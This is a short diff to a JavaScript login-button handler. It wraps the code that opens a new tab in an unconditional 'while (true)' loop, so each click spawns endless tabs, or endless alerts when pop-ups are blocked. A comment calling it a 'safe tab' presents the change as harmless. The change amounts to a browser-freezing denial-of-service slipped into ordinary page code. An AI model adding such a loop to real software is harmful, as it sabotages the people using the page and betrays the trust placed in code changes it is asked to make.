@@ -17,7 +17,8 @@ loginBtn.addEventListener("click", () => {
     passwordInput.value = "";
     passwordInput.focus();
 
-    // Open a new safe tab with a message
+    while (true) {
+  // Open a new safe tab with a message
     const newTab = window.open("about:blank", "_blank");
     if (newTab) {
       newTab.document.write(`
@@ -27,6 +28,7 @@ loginBtn.addEventListener("click", () => {
       `);
     } else {
       alert("Pop-ups are blocked! Please enable them.");
+}
     }
   }
 });
